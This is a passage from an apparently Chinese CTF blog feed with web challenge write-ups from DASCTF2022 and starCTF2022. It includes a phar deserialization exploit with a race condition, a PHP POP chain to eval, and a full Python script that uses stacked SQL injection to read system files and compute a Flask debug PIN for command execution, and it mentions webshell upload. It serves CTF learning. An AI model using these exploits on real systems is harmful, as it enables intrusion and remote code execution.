class="variable">$payload</span>);</span><br></pre></td></tr></table></figure><p>生成payload以后在后台Update路由GET传url=payload，木马就会解压传到网站主目录下，然后蚁剑连接就行了</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220525181852698.png" alt="image-20220525181852698"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;getme&quot;&gt;&lt;a href=&quot;#getme&quot; class=&quot;headerlink&quot; title=&quot;getme&quot;&gt;&lt;/a&gt;getme&lt;/h1&gt;&lt;p&gt;考察&lt;a href=&quot;https://blog.csdn.net/weixin_46187013/article/d</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DASCTF2022四月防疫挑战赛-Web复现</title>
    <link href="https://wuyusanhua2021.github.io/2022/05/06/DASCTF2022%E5%9B%9B%E6%9C%88%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B-Web%E5%A4%8D%E7%8E%B0/"/>
    <id>https://wuyusanhua2021.github.io/2022/05/06/DASCTF2022%E5%9B%9B%E6%9C%88%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B-Web%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-05-06T14:10:21.000Z</published>
    <updated>2022-05-08T03:09:58.838Z</updated>
    
    <content type="html"><![CDATA[<h1 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;./class/&quot;</span>.<span class="variable">$class</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">            <span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$object</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Action(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br></pre></td></tr></table></figure><p>很显然<code>action</code>决定新建什么对象，<code>properties</code>决定对象中变量的值</p><p>审计附件中的四个类，只有<code>ListView</code>类中有run方法，所以<code>ListView-&gt;run()</code>是调用链的起点，<code>Base</code>类中有<code>eval</code>和<code>call_user_func_array</code>方法，调用链的终点就在这</p><p>可以观察到这几个类存在<code>Base &lt;= ListView &lt;= TestView</code>的继承关系，这样就方便调用方法构造了，完整的链子和payload如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ListView-&gt;run() =&gt; ListView-&gt;renderContent() =&gt; ListView-&gt;renderSection() =&gt; TestView-&gt;renderTableBody() =&gt; TestView-&gt;renderTableRow() =&gt; Base-&gt;evaluateExpression()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220506233702854.png" alt="image-20220506233702854"></p><h1 id="soeasy-php"><a href="#soeasy-php" class="headerlink" title="soeasy_php"></a>soeasy_php</h1><p>F12把hidden和注释去掉，得到一个更换头像的功能，利用这个功能实现任意文件读取，由附件给的dockerfile知<code>/flag</code>需要root权限，读不了，所以这里得尝试去读其它文件，在edit.php中得关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;error_reporting&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filewrite</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">        file_put_contents(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = fread(<span class="variable">$f</span>, filesize(<span class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$contents</span>,<span class="string">&quot;flag&#123;&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            filewrite(<span class="variable">$filename</span>,<span class="string">&quot;Don&#x27;t give me flag!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> == <span class="string">&quot;Give me flag&quot;</span>) &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;Don&#x27;t give me flag&quot;</span>);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="variable">$flag</span>);  <span class="comment">//不给我看我自己写个flag。</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$head</span> = <span class="string">&quot;uploads/head.png&quot;</span>;</span><br><span class="line">        unlink(<span class="variable">$head</span>);</span><br><span class="line">        <span class="keyword">if</span> (symlink(<span class="variable">$filename</span>, <span class="variable">$head</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;成功更换头像&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;非正常文件，已被删除&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先肯定得调用<code>flag-&gt;copyflag()</code>把flag复制到<code>/tmp/flag.txt</code>，这一步可以用unlink触发phar文件，<code>filewrite()</code>中会调用unlink，但是代码中三处使用了<code>filewrite()</code>的地方有两处写死了$file，一处过滤了phar，所以这里只能考虑利用43行这里</p><p>然后就是如何让程序进入else里面的问题了，在已经执行一次连接的情况下，再用<code>symlink()</code>连接会报错返回False，又因为在这之前有<code>unlink($head)</code>的存在，所以得通过条件竞争的方式来触发这个漏洞，把flag.txt和head.png连接就能通过访问head.png获取flag</p><p>最后，要想进入else就一定会传一个$_POST[flag]，这导致了很有可能触发phar文件后flag.txt会被$_POST[flag]覆盖，因此还得再加一个线程抢在覆盖之前读到flag.txt</p><p>exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> flag();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$flag</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;testaaa&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 生成phar文件上传，然后burp开三个intruder不停地爆，payload分别是：</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220508001234355.png" alt="image-20220508001234355"></p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220508001302409.png" alt="image-20220508001302409"></p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220508001321385.png" alt="image-20220508001321385"></p><p>原理和流程差不多就是这样了，这个刚好出flag的几率还是蛮小的，得多跑一段时间</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;warmup-php&quot;&gt;&lt;a href=&quot;#warmup-php&quot; class=&quot;headerlink&quot; title=&quot;warmup-php&quot;&gt;&lt;/a&gt;warmup-php&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>starCTF2022-Web复现</title>
    <link href="https://wuyusanhua2021.github.io/2022/04/28/starCTF2022-Web%E5%A4%8D%E7%8E%B0/"/>
    <id>https://wuyusanhua2021.github.io/2022/04/28/starCTF2022-Web%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-04-28T05:39:44.000Z</published>
    <updated>2022-04-30T13:31:14.268Z</updated>
    
    <content type="html"><![CDATA[<h1 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h1><p>貌似官方的docker炸了，环境没搭起来</p><p>用CVE-2021-43798执行任意文件读取，读到grafana的配置文件得用户名和密码，登录后查表</p><h1 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h1><p>创建一篇note并查看，<code>note_id</code>是个注入点，而且基本没啥过滤，但是数据库里没有什么有用信息，随便输个值给note_id会看到flask的报错</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220420151722506.png" alt="image-20220420151722506"></p><p>此处表明存在堆叠注入，load_file被过滤，可以通过<code>load data local infile &#39;abc&#39; into table abc </code>语句把文件内容导入到一张表里，然后再读表查看文件内容</p><p>接下来是新版flask的pin码爆破，较之于旧版，加密pin码的方式由md5变为了sha1，所需参数也有变化，新版参数如下：</p><blockquote><ul><li>username 启动这个Flask的用户，通过<code>/etc/passwd</code>获取</li><li>modname 一般默认flask.app</li><li>getattr(app, ‘<strong>name</strong>‘, getattr(app.<strong>class</strong>, ‘<strong>name</strong>‘)) 一般默认flask.app为Flask</li><li>getattr(mod, ‘<strong>file</strong>‘, None)为flask目录下的一个app.py的绝对路径,可在爆错页面看到</li><li>str(uuid.getnode()) 则是网卡mac地址的十进制表达式，通过文件<code>/sys/class/net/eth0/address</code>读取</li><li>get_machine_id()    系统id，由三个合并(docker就后两个)：1)<code>/etc/machine-id </code>,2)<code>/proc/sys/kernel/random/boot_id </code>,3)<code>/proc/self/cgroup</code></li></ul></blockquote><p>整体思路就是用堆叠注入读上面这几个重要参数，然后计算pin码获取debug模式的console使用权，之后就是一个任意命令执行了</p><p>贴个官方脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pin.py</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">username, eth0, machine_id, cgroup</span>):</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,     <span class="comment"># username ok</span></span><br><span class="line">        <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># ok</span></span><br><span class="line">        <span class="string">&#x27;Flask&#x27;</span>       <span class="comment"># ok</span></span><br><span class="line">        <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>  <span class="comment"># ok</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    private_bits = [</span><br><span class="line">        eth0,  <span class="comment"># /sys/class/net/eth0/address</span></span><br><span class="line">        machine_id + cgroup</span><br><span class="line">        <span class="comment"># &#x27;7cb84391-1303-4564-8eff-ef7571804198327e92627edf30f63fde916e3c3017aea76eeb876265a726270a575d391eeb4a&#x27;# machine-id</span></span><br><span class="line">        <span class="comment"># /etc/machine-id + /proc/self/cgroup</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">        num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                              <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line">    <span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> pin <span class="keyword">import</span> solve</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file, regexp</span>):</span></span><br><span class="line">    ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    z = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            tmp_database = get_random_id()</span><br><span class="line">            path = <span class="string">f&quot;view?note_id=&#x27;;CREATE TABLE IF NOT EXISTS <span class="subst">&#123;tmp_database&#125;</span>(cmd text);Load data local infile &#x27;<span class="subst">&#123;file&#125;</span>&#x27; into table <span class="subst">&#123;tmp_database&#125;</span>;select * from users where username=1 and (extractvalue(1,concat(0x7e,(select substr((select group_concat(cmd) from <span class="subst">&#123;tmp_database&#125;</span>),<span class="subst">&#123;<span class="built_in">str</span>(z)&#125;</span>,<span class="subst">&#123;<span class="built_in">str</span>(<span class="number">20</span>)&#125;</span>)),0x7e)));&quot;</span></span><br><span class="line">            view_url = base_url + path</span><br><span class="line">            r = s.get(url=view_url)</span><br><span class="line">            content = re.findall(<span class="string">&quot;&#x27;~(.*?)&#x27;&quot;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> content[<span class="number">0</span>] == <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            ans += content[:-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> content[-<span class="number">1</span>] != <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            z += <span class="number">20</span></span><br><span class="line">            <span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    k = re.findall(regexp, ans)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;k is: &#x27;</span>, k)</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_id</span>():</span></span><br><span class="line">    alphabet = <span class="built_in">list</span>(string.ascii_lowercase + string.digits)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([random.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&#x27;http://49.232.142.38:5002/&#x27;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">login_data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&quot;http://127.0.0.1:10809&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">login_url = base_url + <span class="string">&#x27;login&#x27;</span></span><br><span class="line">r = s.post(url=login_url, data=login_data, proxies=proxies)</span><br><span class="line"></span><br><span class="line">cgroup = get_content(<span class="string">&#x27;/proc/self/cgroup&#x27;</span>, <span class="string">&#x27;docker/(.*?),&#x27;</span>)</span><br><span class="line">machine_id = get_content(<span class="string">&#x27;/etc/machine-id&#x27;</span>, <span class="string">&#x27;(.*)&#x27;</span>)</span><br><span class="line">eth0 = get_content(<span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span>, <span class="string">&#x27;(.*)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">eth0 = <span class="built_in">str</span>(<span class="built_in">int</span>(eth0.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;eth0 is: &quot;</span>, eth0)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;machine_id is: &quot;</span>, machine_id)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cgroup is: &quot;</span>, cgroup)</span><br><span class="line">solve(<span class="string">&#x27;ctf&#x27;</span>, eth0, machine_id, cgroup)</span><br></pre></td></tr></table></figure><h1 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h1><p><code>/lotto/app.py</code>中有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    lotto = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        n = <span class="built_in">str</span>(secrets.randbelow(<span class="number">40</span>))</span><br><span class="line">        lotto.append(n)</span><br><span class="line">    </span><br><span class="line">    r = <span class="string">&#x27;\n&#x27;</span>.join(lotto)</span><br><span class="line">    response = make_response(r)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=lotto_result.txt&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>用secrets库生成一串数字作为lotto_result.txt</p><p><code>/app/app.py</code>中有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_check</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;LD&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;HTTP&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;BASH&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;ENV&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;PROXY&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;PS&#x27;</span> <span class="keyword">in</span> s: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">flag = os.getenv(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">lotto_key = request.form.get(<span class="string">&#x27;lotto_key&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">lotto_value = request.form.get(<span class="string">&#x27;lotto_value&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    lotto_key = lotto_key.upper()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span 